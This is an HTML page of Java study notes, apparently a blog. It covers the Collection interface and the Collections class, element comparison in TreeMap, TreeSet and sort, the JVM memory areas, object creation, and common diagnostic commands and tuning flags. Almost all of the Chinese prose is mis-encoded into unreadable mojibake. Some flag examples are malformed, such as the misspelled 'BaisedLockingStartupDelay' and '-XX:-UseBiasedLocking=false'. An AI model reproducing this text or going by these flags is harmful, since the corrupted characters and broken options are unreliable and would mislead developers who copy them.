<li>java.util.Collection æ˜¯ä¸€ä¸ªé›†åˆæ¥å£ï¼ˆé›†åˆç±»çš„ä¸€ä¸ªé¡¶çº§æ¥å£ï¼‰ã€‚å®ƒæä¾›äº†å¯¹é›†åˆå¯¹è±¡è¿›è¡ŒåŸºæœ¬æ“ä½œçš„é€šç”¨æ¥å£æ–¹æ³•ã€‚Collectionæ¥å£åœ¨Java ç±»åº“ä¸­æœ‰å¾ˆå¤šå…·ä½“çš„å®ç°ã€‚Collectionæ¥å£çš„æ„ä¹‰æ˜¯ä¸ºå„ç§å…·ä½“çš„é›†åˆæä¾›äº† å¤§åŒ–çš„ç»Ÿä¸€æ“ä½œæ–¹å¼ï¼Œå…¶ç›´æ¥ç»§æ‰¿æ¥å£æœ‰Listä¸Setã€‚</li>
<li>Collectionsåˆ™æ˜¯é›†åˆç±»çš„ä¸€ä¸ªå·¥å…·ç±»&#x2F;å¸®åŠ©ç±»ï¼Œå…¶ä¸­æä¾›äº†ä¸€ç³»åˆ—é™æ€æ–¹æ³•ï¼Œç”¨äºå¯¹é›†åˆä¸­å…ƒç´ è¿›è¡Œæ’åºã€æœç´¢ä»¥åŠçº¿ç¨‹å®‰å…¨ç­‰å„ç§æ“ä½œã€‚</li>
</ul>
<h3 id="TreeMap-å’Œ-TreeSet-åœ¨æ’åºæ—¶å¦‚ä½•æ¯”è¾ƒå…ƒç´ ï¼Ÿ-Collections-å·¥å…·ç±»ä¸­çš„-sort-æ–¹æ³•å¦‚ä½•æ¯”è¾ƒå…ƒç´ ï¼Ÿ"><a href="#TreeMap-å’Œ-TreeSet-åœ¨æ’åºæ—¶å¦‚ä½•æ¯”è¾ƒå…ƒç´ ï¼Ÿ-Collections-å·¥å…·ç±»ä¸­çš„-sort-æ–¹æ³•å¦‚ä½•æ¯”è¾ƒå…ƒç´ ï¼Ÿ" class="headerlink" title="TreeMap å’Œ TreeSet åœ¨æ’åºæ—¶å¦‚ä½•æ¯”è¾ƒå…ƒç´ ï¼Ÿ Collections å·¥å…·ç±»ä¸­çš„ sort()æ–¹æ³•å¦‚ä½•æ¯”è¾ƒå…ƒç´ ï¼Ÿ"></a>TreeMap å’Œ TreeSet åœ¨æ’åºæ—¶å¦‚ä½•æ¯”è¾ƒå…ƒç´ ï¼Ÿ Collections å·¥å…·ç±»ä¸­çš„ sort()æ–¹æ³•å¦‚ä½•æ¯”è¾ƒå…ƒç´ ï¼Ÿ</h3><p>TreeSet è¦æ±‚å­˜æ”¾çš„å¯¹è±¡æ‰€å±çš„ç±»å¿…é¡»å®ç° Comparable æ¥å£ï¼Œè¯¥æ¥å£æä¾›äº†æ¯”è¾ƒå…ƒç´ çš„ compareTo()æ–¹æ³•ï¼Œå½“æ’å…¥å…ƒç´ æ—¶ä¼šå›è°ƒè¯¥æ–¹æ³•æ¯”è¾ƒå…ƒç´ çš„å¤§å°ã€‚</p>
<p>TreeMap è¦æ±‚å­˜æ”¾çš„é”®å€¼å¯¹æ˜ å°„çš„é”®å¿…é¡»å®ç° Comparable æ¥å£ä»è€Œæ ¹æ®é”®å¯¹å…ƒç´ è¿›è¡Œæ’åºã€‚</p>
<p>Collections å·¥å…·ç±»çš„ sort æ–¹æ³•æœ‰ä¸¤ç§é‡è½½çš„å½¢å¼ï¼Œ</p>
<p>ç¬¬ä¸€ç§è¦æ±‚ä¼ å…¥çš„å¾…æ’åºå®¹å™¨ä¸­å­˜æ”¾çš„å¯¹è±¡æ¯”è¾ƒå®ç° Comparable æ¥å£ä»¥å®ç°å…ƒç´ çš„æ¯”è¾ƒï¼›</p>
<p>ç¬¬äºŒç§ä¸å¼ºåˆ¶æ€§çš„è¦æ±‚å®¹å™¨ä¸­çš„å…ƒç´ å¿…é¡»å¯æ¯”è¾ƒï¼Œä½†æ˜¯è¦æ±‚ä¼ å…¥ç¬¬äºŒä¸ªå‚æ•°ï¼Œå‚æ•°æ˜¯Comparator æ¥å£çš„å­ç±»å‹ï¼ˆéœ€è¦é‡å†™ compare æ–¹æ³•å®ç°å…ƒç´ çš„æ¯”è¾ƒï¼‰ï¼Œç›¸å½“äºä¸€ä¸ªä¸´æ—¶å®šä¹‰çš„æ’åºè§„åˆ™ï¼Œå…¶å®å°±æ˜¯é€šè¿‡æ¥å£æ³¨å…¥æ¯”è¾ƒå…ƒç´ å¤§å°çš„ç®—æ³•ï¼Œä¹Ÿæ˜¯å¯¹å›è°ƒæ¨¡å¼çš„åº”ç”¨ï¼ˆJava ä¸­å¯¹å‡½æ•°å¼ç¼–ç¨‹çš„æ”¯æŒï¼‰ã€‚</p>
<h1 id="JVM"><a href="#JVM" class="headerlink" title="JVM"></a>JVM</h1><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848716.png" alt="image-20210508171931448"></p>
<h2 id="è¿è¡Œæ—¶æ•°æ®åŒºåŸŸ"><a href="#è¿è¡Œæ—¶æ•°æ®åŒºåŸŸ" class="headerlink" title="è¿è¡Œæ—¶æ•°æ®åŒºåŸŸ"></a>è¿è¡Œæ—¶æ•°æ®åŒºåŸŸ</h2><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848702.png" alt="JVMè¿è¡Œæ—¶æ•°æ®åŒºåŸŸ" style="zoom:80%;" />

<img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848700.png" alt="Javaè¿è¡Œæ—¶æ•°æ®åŒºåŸŸJDK1.8" style="zoom:80%;" />



<h3 id="å †"><a href="#å †" class="headerlink" title="å †"></a>å †</h3><p>jdk 7 æ–°ç”Ÿä»£,è€å¹´ä»£,æ°¸ä¹…ä»£;jdk8 æ°¸ä¹…ä»£è¢«ç§»é™¤,ç”¨å…ƒç©ºé—´ä»£æ›¿,å…ƒç©ºé—´ä½¿ç”¨çš„æ˜¯ç›´æ¥å†…å­˜;å¯¹è±¡åˆå§‹å¹´é¾„ä¸º1,åˆ°äº†15ä¼šå»è€å¹´ä»£;</p>
<p>OutOfMemoryError: GC Overhead Limit Exceeded ï¼š å½“JVMèŠ±å¤ªå¤šæ—¶é—´æ‰§è¡Œåƒåœ¾å›æ”¶å¹¶ä¸”åªèƒ½å›æ”¶å¾ˆå°‘çš„å †ç©ºé—´æ—¶ï¼Œå°±ä¼šå‘ç”Ÿæ­¤é”™è¯¯;</p>
<p>java.lang.OutOfMemoryError: Java heap space :å‡å¦‚åœ¨åˆ›å»ºæ–°çš„å¯¹è±¡æ—¶, å †å†…å­˜ä¸­çš„ç©ºé—´ä¸è¶³ä»¥å­˜æ”¾æ–°åˆ›å»ºçš„å¯¹è±¡, å°±ä¼šå¼•å‘java.lang.OutOfMemoryError: Java heap space é”™è¯¯ã€‚(å’Œæœ¬æœºç‰©ç†å†…å­˜æ— å…³ï¼Œå’Œä½ é…ç½®çš„å†…å­˜å¤§å°æœ‰å…³ï¼)</p>
<h3 id="æ–¹æ³•åŒº"><a href="#æ–¹æ³•åŒº" class="headerlink" title="æ–¹æ³•åŒº"></a>æ–¹æ³•åŒº</h3><p>ä¸ºæ°¸ä¹…ä»£;çº¿ç¨‹å…±äº«;å­˜å‚¨å·²è¢«è™šæ‹ŸæœºåŠ è½½çš„ç±»ä¿¡æ¯ã€å¸¸é‡ã€é™æ€å˜é‡ã€å³æ—¶ç¼–è¯‘å™¨ç¼–è¯‘åçš„ä»£ç ç­‰æ•°æ®; æ–¹æ³•åŒºå’Œæ°¸ä¹…ä»£çš„å…³ç³»å¾ˆåƒ Java ä¸­æ¥å£å’Œç±»çš„å…³ç³»ï¼Œç±»å®ç°äº†æ¥å£ï¼Œè€Œæ°¸ä¹…ä»£å°±æ˜¯ HotSpot è™šæ‹Ÿæœºå¯¹è™šæ‹Ÿæœºè§„èŒƒä¸­æ–¹æ³•åŒºçš„ä¸€ç§å®ç°æ–¹å¼;</p>
<h4 id="ä¸ºä»€ä¹ˆè¦å°†æ°¸ä¹…ä»£-PermGen-æ›¿æ¢ä¸ºå…ƒç©ºé—´-MetaSpace"><a href="#ä¸ºä»€ä¹ˆè¦å°†æ°¸ä¹…ä»£-PermGen-æ›¿æ¢ä¸ºå…ƒç©ºé—´-MetaSpace" class="headerlink" title="ä¸ºä»€ä¹ˆè¦å°†æ°¸ä¹…ä»£(PermGen)æ›¿æ¢ä¸ºå…ƒç©ºé—´(MetaSpace)?"></a>ä¸ºä»€ä¹ˆè¦å°†æ°¸ä¹…ä»£(PermGen)æ›¿æ¢ä¸ºå…ƒç©ºé—´(MetaSpace)?</h4><p>æ•´ä¸ªæ°¸ä¹…ä»£æœ‰ä¸€ä¸ª JVM æœ¬èº«è®¾ç½®å›ºå®šå¤§å°ä¸Šé™ï¼Œæ— æ³•è¿›è¡Œè°ƒæ•´ï¼Œè€Œå…ƒç©ºé—´ä½¿ç”¨çš„æ˜¯ç›´æ¥å†…å­˜ï¼Œå—æœ¬æœºå¯ç”¨å†…å­˜çš„é™åˆ¶ï¼Œè™½ç„¶å…ƒç©ºé—´ä»æ—§å¯èƒ½æº¢å‡ºï¼Œä½†æ˜¯æ¯”åŸæ¥å‡ºç°çš„å‡ ç‡ä¼šæ›´å°; java.lang.OutOfMemoryError: MetaSpace; å…ƒç©ºé—´é‡Œé¢å­˜æ”¾çš„æ˜¯ç±»çš„å…ƒæ•°æ®ï¼Œè¿™æ ·åŠ è½½å¤šå°‘ç±»çš„å…ƒæ•°æ®å°±ä¸ç”± MaxPermSize æ§åˆ¶äº†, è€Œç”±ç³»ç»Ÿçš„å®é™…å¯ç”¨ç©ºé—´æ¥æ§åˆ¶ï¼Œè¿™æ ·èƒ½åŠ è½½çš„ç±»å°±æ›´å¤šäº†; åœ¨ JDK8ï¼Œåˆå¹¶ HotSpot å’Œ JRockit çš„ä»£ç æ—¶, JRockit ä»æ¥æ²¡æœ‰ä¸€ä¸ªå«æ°¸ä¹…ä»£çš„ä¸œè¥¿, åˆå¹¶ä¹‹åå°±æ²¡æœ‰å¿…è¦é¢å¤–çš„è®¾ç½®è¿™ä¹ˆä¸€ä¸ªæ°¸ä¹…ä»£çš„åœ°æ–¹äº†ã€‚</p>
<h3 id="è¿è¡Œæ—¶å¸¸é‡æ± "><a href="#è¿è¡Œæ—¶å¸¸é‡æ± " class="headerlink" title="è¿è¡Œæ—¶å¸¸é‡æ± "></a>è¿è¡Œæ—¶å¸¸é‡æ± </h3><p>è¿è¡Œæ—¶å¸¸é‡æ± æ˜¯æ–¹æ³•åŒºçš„ä¸€éƒ¨åˆ†;JDK1.7ä¹‹å‰è¿è¡Œæ—¶å¸¸é‡æ± é€»è¾‘åŒ…å«å­—ç¬¦ä¸²å¸¸é‡æ± å­˜æ”¾åœ¨æ–¹æ³•åŒº, æ­¤æ—¶hotspotè™šæ‹Ÿæœºå¯¹æ–¹æ³•åŒºçš„å®ç°ä¸ºæ°¸ä¹…ä»£; JDK1.7 å­—ç¬¦ä¸²å¸¸é‡æ± è¢«ä»æ–¹æ³•åŒºæ‹¿åˆ°äº†å †ä¸­, è¿™é‡Œæ²¡æœ‰æåˆ°è¿è¡Œæ—¶å¸¸é‡æ± ,ä¹Ÿå°±æ˜¯è¯´å­—ç¬¦ä¸²å¸¸é‡æ± è¢«å•ç‹¬æ‹¿åˆ°å †,è¿è¡Œæ—¶å¸¸é‡æ± å‰©ä¸‹çš„ä¸œè¥¿è¿˜åœ¨æ–¹æ³•åŒº, ä¹Ÿå°±æ˜¯hotspotä¸­çš„æ°¸ä¹…ä»£ <strong>; JDK1.8 hotspotç§»é™¤äº†æ°¸ä¹…ä»£ç”¨å…ƒç©ºé—´(Metaspace)å–è€Œä»£ä¹‹, è¿™æ—¶å€™å­—ç¬¦ä¸²å¸¸é‡æ± è¿˜åœ¨å †, è¿è¡Œæ—¶å¸¸é‡æ± è¿˜åœ¨æ–¹æ³•åŒº, åªä¸è¿‡æ–¹æ³•åŒºçš„å®ç°ä»æ°¸ä¹…ä»£å˜æˆäº†å…ƒç©ºé—´(Metaspace);</strong></p>
<h4 id="JVM-å¸¸é‡æ± ä¸­å­˜å‚¨çš„æ˜¯å¯¹è±¡è¿˜æ˜¯å¼•ç”¨å‘¢ï¼Ÿ"><a href="#JVM-å¸¸é‡æ± ä¸­å­˜å‚¨çš„æ˜¯å¯¹è±¡è¿˜æ˜¯å¼•ç”¨å‘¢ï¼Ÿ" class="headerlink" title="JVM å¸¸é‡æ± ä¸­å­˜å‚¨çš„æ˜¯å¯¹è±¡è¿˜æ˜¯å¼•ç”¨å‘¢ï¼Ÿ"></a>JVM å¸¸é‡æ± ä¸­å­˜å‚¨çš„æ˜¯å¯¹è±¡è¿˜æ˜¯å¼•ç”¨å‘¢ï¼Ÿ</h4><p>å¦‚æœæ˜¯runtime constant poolï¼ˆè€Œä¸æ˜¯interned string pool &#x2F; StringTableä¹‹ç±»çš„å…¶ä»–ä¸œè¥¿ï¼‰çš„è¯ï¼Œå…¶ä¸­çš„å¼•ç”¨ç±»å‹å¸¸é‡ï¼ˆä¾‹å¦‚CONSTANT_Stringã€CONSTANT_Classã€CONSTANT_MethodHandleã€CONSTANT_MethodTypeä¹‹ç±»ï¼‰éƒ½å­˜çš„æ˜¯å¼•ç”¨ï¼Œå®é™…çš„å¯¹è±¡è¿˜æ˜¯å­˜åœ¨Java heapä¸Šçš„ã€‚</p>
<h2 id="å¯¹è±¡çš„åˆ›å»º"><a href="#å¯¹è±¡çš„åˆ›å»º" class="headerlink" title="å¯¹è±¡çš„åˆ›å»º"></a>å¯¹è±¡çš„åˆ›å»º</h2><p>ç±»åŠ è½½æ£€æŸ¥: è™šæ‹Ÿæœºé‡åˆ°ä¸€æ¡ new æŒ‡ä»¤æ—¶ï¼Œé¦–å…ˆå°†å»æ£€æŸ¥è¿™ä¸ªæŒ‡ä»¤çš„å‚æ•°æ˜¯å¦èƒ½åœ¨å¸¸é‡æ± ä¸­å®šä½åˆ°è¿™ä¸ªç±»çš„ç¬¦å·å¼•ç”¨ï¼Œå¹¶ä¸”æ£€æŸ¥è¿™ä¸ªç¬¦å·å¼•ç”¨ä»£è¡¨çš„ç±»æ˜¯å¦å·²è¢«åŠ è½½è¿‡ã€è§£æå’Œåˆå§‹åŒ–è¿‡ã€‚å¦‚æœæ²¡æœ‰ï¼Œé‚£å¿…é¡»å…ˆæ‰§è¡Œç›¸åº”çš„ç±»åŠ è½½è¿‡ç¨‹ã€‚</p>
<p>åˆ†é…å†…å­˜: æŒ‡é’ˆç¢°æ’:å†…å­˜è§„æ•´çš„æƒ…å†µä¸‹,GCæ”¶é›†å™¨Serial,Parnew;ç©ºé—²åˆ—è¡¨:å †å†…å­˜ä¸è§„æ•´çš„æƒ…å†µä¸‹,CMS; å¤šçº¿ç¨‹ä¸‹ç”¨CAS+å¤±è´¥é‡è¯•;TLAB,ä¸ºæ¯ä¸€ä¸ªçº¿ç¨‹é¢„å…ˆåœ¨ Eden åŒºåˆ†é…ä¸€å—å„¿å†…å­˜ï¼ŒJVM åœ¨ç»™çº¿ç¨‹ä¸­çš„å¯¹è±¡åˆ†é…å†…å­˜æ—¶ï¼Œé¦–å…ˆåœ¨ TLAB åˆ†é…ï¼Œå½“å¯¹è±¡å¤§äº TLAB ä¸­çš„å‰©ä½™å†…å­˜æˆ– TLAB çš„å†…å­˜å·²ç”¨å°½æ—¶ï¼Œå†é‡‡ç”¨ä¸Šè¿°çš„ CAS è¿›è¡Œå†…å­˜åˆ†é…;</p>
<p>åˆå§‹åŒ–é›¶å€¼:å†…å­˜åˆ†é…å®Œæˆåï¼Œè™šæ‹Ÿæœºéœ€è¦å°†åˆ†é…åˆ°çš„å†…å­˜ç©ºé—´éƒ½åˆå§‹åŒ–ä¸ºé›¶å€¼ï¼ˆä¸åŒ…æ‹¬å¯¹è±¡å¤´ï¼‰ï¼Œè¿™ä¸€æ­¥æ“ä½œä¿è¯äº†å¯¹è±¡çš„å®ä¾‹å­—æ®µåœ¨ Java ä»£ç ä¸­å¯ä»¥ä¸èµ‹åˆå§‹å€¼å°±ç›´æ¥ä½¿ç”¨ï¼Œç¨‹åºèƒ½è®¿é—®åˆ°è¿™äº›å­—æ®µçš„æ•°æ®ç±»å‹æ‰€å¯¹åº”çš„é›¶å€¼ã€‚</p>
<p>è®¾ç½®å¯¹è±¡å¤´:åˆå§‹åŒ–é›¶å€¼å®Œæˆä¹‹åï¼Œè™šæ‹Ÿæœºè¦å¯¹å¯¹è±¡è¿›è¡Œå¿…è¦çš„è®¾ç½®ï¼Œä¾‹å¦‚è¿™ä¸ªå¯¹è±¡æ˜¯å“ªä¸ªç±»çš„å®ä¾‹ã€å¦‚ä½•æ‰èƒ½æ‰¾åˆ°ç±»çš„å…ƒæ•°æ®ä¿¡æ¯ã€å¯¹è±¡çš„å“ˆå¸Œç ã€å¯¹è±¡çš„ GC åˆ†ä»£å¹´é¾„ç­‰ä¿¡æ¯ã€‚ è¿™äº›ä¿¡æ¯å­˜æ”¾åœ¨å¯¹è±¡å¤´ä¸­ã€‚ å¦å¤–ï¼Œæ ¹æ®è™šæ‹Ÿæœºå½“å‰è¿è¡ŒçŠ¶æ€çš„ä¸åŒï¼Œå¦‚æ˜¯å¦å¯ç”¨åå‘é”ç­‰ï¼Œå¯¹è±¡å¤´ä¼šæœ‰ä¸åŒçš„è®¾ç½®æ–¹å¼ã€‚</p>
<p>æ‰§è¡Œinitæ–¹æ³•: åœ¨ä¸Šé¢å·¥ä½œéƒ½å®Œæˆä¹‹åï¼Œä»è™šæ‹Ÿæœºçš„è§†è§’æ¥çœ‹ï¼Œä¸€ä¸ªæ–°çš„å¯¹è±¡å·²ç»äº§ç”Ÿäº†ï¼Œä½†ä» Java ç¨‹åºçš„è§†è§’æ¥çœ‹ï¼Œå¯¹è±¡åˆ›å»ºæ‰åˆšå¼€å§‹ï¼Œ<init>æ–¹æ³•è¿˜æ²¡æœ‰æ‰§è¡Œï¼Œæ‰€æœ‰çš„å­—æ®µéƒ½è¿˜ä¸ºé›¶ã€‚æ‰€ä»¥ä¸€èˆ¬æ¥è¯´ï¼Œæ‰§è¡Œ new æŒ‡ä»¤ä¹‹åä¼šæ¥ç€æ‰§è¡Œ <init> æ–¹æ³•ï¼ŒæŠŠå¯¹è±¡æŒ‰ç…§ç¨‹åºå‘˜çš„æ„æ„¿è¿›è¡Œåˆå§‹åŒ–ï¼Œè¿™æ ·ä¸€ä¸ªçœŸæ­£å¯ç”¨çš„å¯¹è±¡æ‰ç®—å®Œå…¨äº§ç”Ÿå‡ºæ¥ã€‚</p>
<h2 id="å¯¹è±¡çš„è®¿é—®å®šä½"><a href="#å¯¹è±¡çš„è®¿é—®å®šä½" class="headerlink" title="å¯¹è±¡çš„è®¿é—®å®šä½"></a>å¯¹è±¡çš„è®¿é—®å®šä½</h2><p>å¥æŸ„å’Œç›´æ¥æŒ‡é’ˆ;ä½¿ç”¨å¥æŸ„æ¥è®¿é—®çš„æœ€å¤§å¥½å¤„æ˜¯ reference ä¸­å­˜å‚¨çš„æ˜¯ç¨³å®šçš„å¥æŸ„åœ°å€ï¼Œåœ¨å¯¹è±¡è¢«ç§»åŠ¨æ—¶åªä¼šæ”¹å˜å¥æŸ„ä¸­çš„å®ä¾‹æ•°æ®æŒ‡é’ˆï¼Œè€Œ reference æœ¬èº«ä¸éœ€è¦ä¿®æ”¹ã€‚ä½¿ç”¨ç›´æ¥æŒ‡é’ˆè®¿é—®æ–¹å¼æœ€å¤§çš„å¥½å¤„å°±æ˜¯é€Ÿåº¦å¿«ï¼Œå®ƒèŠ‚çœäº†ä¸€æ¬¡æŒ‡é’ˆå®šä½çš„æ—¶é—´å¼€é”€;</p>
<h2 id="JVMå¸¸ç”¨è°ƒä¼˜æŒ‡ä»¤å’Œå‚æ•°"><a href="#JVMå¸¸ç”¨è°ƒä¼˜æŒ‡ä»¤å’Œå‚æ•°" class="headerlink" title="JVMå¸¸ç”¨è°ƒä¼˜æŒ‡ä»¤å’Œå‚æ•°"></a>JVMå¸¸ç”¨è°ƒä¼˜æŒ‡ä»¤å’Œå‚æ•°</h2><p>1ï¼‰jpså‘½ä»¤ç”¨äºæŸ¥è¯¢æ­£åœ¨è¿è¡Œçš„JVMè¿›ç¨‹</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848707.png" alt="img"></p>
<p>2ï¼‰jstatå¯ä»¥å®æ—¶æ˜¾ç¤ºæœ¬åœ°æˆ–è¿œç¨‹JVMè¿›ç¨‹ä¸­ç±»è£…è½½ã€å†…å­˜ã€åƒåœ¾æ”¶é›†ã€JITç¼–è¯‘ç­‰æ•°æ®</p>
<p>&#x2F;home&#x2F;tools&#x2F;jdk1.8.0_181&#x2F;bin&#x2F;jstat -gcutil 30386ï¼ˆjavaè¿›ç¨‹å·ï¼‰ 2000</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848739.png" alt="img"></p>
<p>3ï¼‰jinfoç”¨äºæŸ¥è¯¢å½“å‰è¿è¡Œè¿™çš„JVMå±æ€§å’Œå‚æ•°çš„å€¼<br>[java@xftest0 ~]$ jinfo 43934<br>Attaching to process ID 43934, please waitâ€¦<br>Debugger attached successfully.<br>Server compiler detected.<br>JVM version is 20.45-b01<br>Java System Properties:</p>
<p>java.runtime.name &#x3D; Java(TM) SE Runtime Environment<br>sun.boot.library.path &#x3D; &#x2F;usr&#x2F;java&#x2F;jdk1.6.0_45&#x2F;jre&#x2F;lib&#x2F;amd64<br>java.vm.version &#x3D; 20.45-b01<br>java.vm.vendor &#x3D; Sun Microsystems Inc.<br>java.vendor.url &#x3D; <a href="http://java.sun.com/">http://java.sun.com/</a><br>path.separator &#x3D; :<br>java.vm.name &#x3D; Java HotSpot(TM) 64-Bit Server VM<br>file.encoding.pkg &#x3D; sun.io<br>sun.java.launcher &#x3D; SUN_STANDARD<br>env &#x3D; dev<br>user.country &#x3D; US<br>sun.os.patch.level &#x3D; unknown<br>4ï¼‰jmapç”¨äºæ˜¾ç¤ºå½“å‰Javaå †å’Œæ°¸ä¹…ä»£çš„è¯¦ç»†ä¿¡æ¯ </p>
<p>å‘½ä»¤jmapæ˜¯ä¸€ä¸ªå¤šåŠŸèƒ½çš„å‘½ä»¤ã€‚å®ƒå¯ä»¥ç”Ÿæˆ java ç¨‹åºçš„ dump æ–‡ä»¶ï¼Œç”Ÿæˆdumpçš„å‘½ä»¤ä¸ºï¼šjmap -dump:live,format&#x3D;b,file&#x3D;æ–‡æ–‡ä»¶å(hprofåç¼€) <PID> ä¹Ÿå¯ä»¥æŸ¥çœ‹å †å†…å¯¹è±¡ç¤ºä¾‹çš„ç»Ÿè®¡ä¿¡æ¯ã€æŸ¥çœ‹ ClassLoader çš„ä¿¡æ¯ä»¥åŠ finalizer é˜Ÿåˆ—ã€‚ </p>
<p>5ï¼‰jstackç”¨äºç”Ÿæˆå½“å‰JVMçš„æ‰€æœ‰çº¿ç¨‹å¿«ç…§ï¼Œçº¿ç¨‹å¿«ç…§æ˜¯è™šæ‹Ÿæœºæ¯ä¸€æ¡çº¿ç¨‹æ­£åœ¨æ‰§è¡Œçš„æ–¹æ³•,ç›®çš„æ˜¯å®šä½çº¿ç¨‹å‡ºç°é•¿æ—¶é—´åœé¡¿çš„åŸå› ã€‚</p>
<p>6ï¼‰topå‘½ä»¤ é€šè¿‡top -Hp 23344å¯ä»¥æŸ¥çœ‹è¯¥è¿›ç¨‹ä¸‹å„ä¸ªçº¿ç¨‹çš„cpuä½¿ç”¨æƒ…å†µï¼›å…·ä½“å®æ“ç»éªŒè§ï¼š<a href="https://www.cnblogs.com/wuchanming/p/7766994.html">https://www.cnblogs.com/wuchanming/p/7766994.html</a></p>
<p>7ï¼‰pidstatå®æ—¶æŸ¥çœ‹ä¸€ä¸ªè¿›ç¨‹çš„CPUä½¿ç”¨æƒ…å†µåŠä¸Šä¸‹æ–‡åˆ‡æ¢æƒ…å†µ</p>
<p>8ï¼‰vmstatæŸ¥çœ‹æ€»ä½“çš„CPUä½¿ç”¨æƒ…å†µ </p>
<pre><code>  sudo vmstat 2 3

    åƒæ•°2è¡¨ç¤ºæ¯ä¸€ä¸ª2ç§’æ˜¾ç¤ºä¸€ä¸‹ç»“æœï¼Œ3è¡¨ç¤ºæ˜¾ç¤ºç»“æœçš„æ•°ç›®ã€‚

   csåˆ—è¡¨ç¤ºæ¯ç§’ä¸Šä¸‹æ–‡åˆ‡æ¢æ¬¡æ•°ï¼Œusè¡¨ç¤ºç”¨æˆ·CPUæ—¶é—´ã€‚
</code></pre>
<ol start="9">
<li>jmap  -heap 29544 æŸ¥çœ‹æŸä¸€å®ä¾‹jvmé…ç½®</li>
</ol>
<p>äºŒã€JVMå¸¸è§çš„è°ƒä¼˜å‚æ•°åŒ…æ‹¬ï¼š</p>
<p>-Xmx</p>
<p>ã€€ã€€æŒ‡å®šjavaç¨‹åºçš„æœ€å¤§å †å†…å­˜, ä½¿ç”¨java -Xmx5000M -versionåˆ¤æ–­å½“å‰ç³»ç»Ÿèƒ½åˆ†é…çš„æœ€å¤§å †å†…å­˜</p>
<p>-Xms</p>
<p>ã€€ã€€æŒ‡å®šæœ€å°å †å†…å­˜, é€šå¸¸è®¾ç½®æˆè·Ÿæœ€å¤§å †å†…å­˜ä¸€æ ·ï¼Œå‡å°‘GC</p>
<p>-Xmn</p>
<p>ã€€ã€€è®¾ç½®å¹´è½»ä»£å¤§å°ã€‚æ•´ä¸ªå †å¤§å°&#x3D;å¹´è½»ä»£å¤§å° + å¹´è€ä»£å¤§å°ã€‚æ‰€ä»¥å¢å¤§å¹´è½»ä»£åï¼Œå°†ä¼šå‡å°å¹´è€ä»£å¤§å°ã€‚æ­¤å€¼å¯¹ç³»ç»Ÿæ€§èƒ½å½±å“è¾ƒå¤§ï¼ŒSunå®˜æ–¹æ¨èé…ç½®ä¸ºæ•´ä¸ªå †çš„3&#x2F;8ã€‚</p>
<p>-Xss</p>
<p>ã€€ã€€æŒ‡å®šçº¿ç¨‹çš„æœ€å¤§æ ˆç©ºé—´, æ­¤å‚æ•°å†³å®šäº†javaå‡½æ•°è°ƒç”¨çš„æ·±åº¦, å€¼è¶Šå¤§è°ƒç”¨æ·±åº¦è¶Šæ·±, è‹¥å€¼å¤ªå°åˆ™å®¹æ˜“å‡ºæ ˆæº¢å‡ºé”™è¯¯(StackOverflowError)</p>
<p>-XX:PermSize</p>
<p>ã€€ã€€æŒ‡å®šæ–¹æ³•åŒº(æ°¸ä¹…åŒº)çš„åˆå§‹å€¼,é»˜è®¤æ˜¯ç‰©ç†å†…å­˜çš„1&#x2F;64ï¼Œ åœ¨Java8æ°¸ä¹…åŒºç§»é™¤, ä»£ä¹‹çš„æ˜¯å…ƒæ•°æ®åŒºï¼Œ ç”±-XX:MetaspaceSizeæŒ‡å®š</p>
<p>-XX:MaxPermSize</p>
<p>ã€€ã€€æŒ‡å®šæ–¹æ³•åŒºçš„æœ€å¤§å€¼, é»˜è®¤æ˜¯ç‰©ç†å†…å­˜çš„1&#x2F;4,åœ¨java8ä¸­ç”±-XX:MaxMetaspaceSizeæŒ‡å®šå…ƒæ•°æ®åŒºçš„å¤§å°</p>
<p>-XX:NewRatio&#x3D;n</p>
<p>ã€€ã€€å¹´è€ä»£ä¸å¹´è½»ä»£çš„æ¯”å€¼ï¼Œ-XX:NewRatio&#x3D;2, è¡¨ç¤ºå¹´è€ä»£ä¸å¹´è½»ä»£çš„æ¯”å€¼ä¸º2:1</p>
<p>-XX:SurvivorRatio&#x3D;n</p>
<p>ã€€ã€€EdenåŒºä¸SurvivoråŒºçš„å¤§å°æ¯”å€¼ï¼Œ-XX:SurvivorRatio&#x3D;8è¡¨ç¤ºEdenåŒºä¸SurvivoråŒºçš„å¤§å°æ¯”å€¼æ˜¯8:1:1ï¼Œå› ä¸ºSurvivoråŒºæœ‰ä¸¤ä¸ª(from, to)</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">-XX:+PrintGCDetails // æ‰“å°gcä¿¡æ¯</span><br><span class="line">-XX:BaisedLockingStartupDelay=0 // åå‘é”ä»€ä¹ˆå¼€å¯</span><br><span class="line">-XX:-UseBiasedLocking=<span class="literal">false</span> // ä¸ä½¿ç”¨åå‘é”</span><br><span class="line"></span><br><span class="line">-XX:MaxTenuringThreshold=15; //ä¸»è¦æ˜¯æ§åˆ¶æ–°ç”Ÿä»£éœ€è¦ç»å†å¤šå°‘æ¬¡GCæ™‹å‡åˆ°è€å¹´ä»£ä¸­çš„æœ€å¤§é˜ˆå€¼; Tenuring Threshold[ËˆÎ¸reÊƒhÉ™ÊŠld]ç»ˆèº«ç›‘ç¦çš„é—¨æ§›</span><br><span class="line">-XX:MetaspaceSize=N //è®¾ç½® Metaspace çš„åˆå§‹ï¼ˆå’Œæœ€å°å¤§å°ï¼‰</span><br><span class="line">-XX:MaxMetaspaceSize=N //è®¾ç½® Metaspace çš„æœ€å¤§å¤§å°</span><br><span class="line">-XX:SurvivorRatio=8 </span><br><span class="line">// æœ€å¤§å †å†…å­˜ä¸º20m, æœ€å°å †å†…å­˜ä¸º5m, é€šå¸¸è®¾ç½®ä¸ºå’Œæœ€å¤§ä¸€æ ·,å‡å°‘GC</span><br><span class="line">-Xmx20m -Xms5m -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=ä½ è¦è¾“å‡ºçš„æ—¥å¿—è·¯å¾„</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Jprofiler</p>
<p>åˆ†æå†…å­˜dumpæ–‡ä»¶,å¿«é€Ÿå®šä½å†…å­˜æ³„æ¼</p>
